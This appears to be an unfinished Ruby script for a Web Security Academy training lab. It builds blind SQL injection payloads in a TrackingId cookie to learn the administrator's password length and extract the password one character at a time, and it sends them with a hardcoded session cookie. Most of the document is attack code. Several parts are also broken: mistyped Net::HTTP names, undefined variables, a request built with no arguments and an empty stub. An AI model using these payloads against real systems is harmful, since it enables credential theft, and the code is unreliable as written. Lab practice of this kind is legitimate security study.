require 'uri'
require 'net/http'

SESSION_COOKIE = "rYjXpryytVRhVOZaS4Th1QtvGCfczSHg"
TRACKING_ID = "G9z8hNrmTzEUiFDR"
BASE_URI = "https://0a6e003a043b291e81d99dd60081008c.web-security-academy.net/"
CHARS = ('a'..'z').to_a.concat((0..9).to_a)
ASCII_RANGE = (32..126)

def http_client
  http = NET::HTTP.new(BASE_URI, BASE_URI.port)
  http.use_ssl = (base.scheme = "https")
  http.open_timeout = 5
  http.read_timeout = 10
  http
end

def built_request(request_uri, injected_tracking_id)
  req = Net:HTTP::Get.new(request_uri)
  req["Accept"] = "text/html"
  req["Cookie"] = "TrackingId=#{injected_tracking_id}; session=#{SESSION_COOKIE}"
  req
end




def sql_password_length(operator, length)
  "#{TRACKING_ID}' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password) #{operator} #{length})='a"
end

def sql_char_test(pword_char_index, test_ascii_no, operator)
  "#{TRACKING_ID}' AND ASCII((
    SELECT SUBSTRING(password, #{pword_char_index}, 1)
    FROM users
    WHERE username='administrator'
  )) #{operator} '#{test_ascii_no}"
end

def password_length?
  # from 1..30 call sql_password_length
end


def fetch
  response = http_client.request(built_request)

  puts "Status: #{res.code} #{res.message}"
  puts "Content-Type: #{res['content-type']}"
  puts "Body bytes: #{res.body.bytesize}"
  puts res.body[0, 300]
end
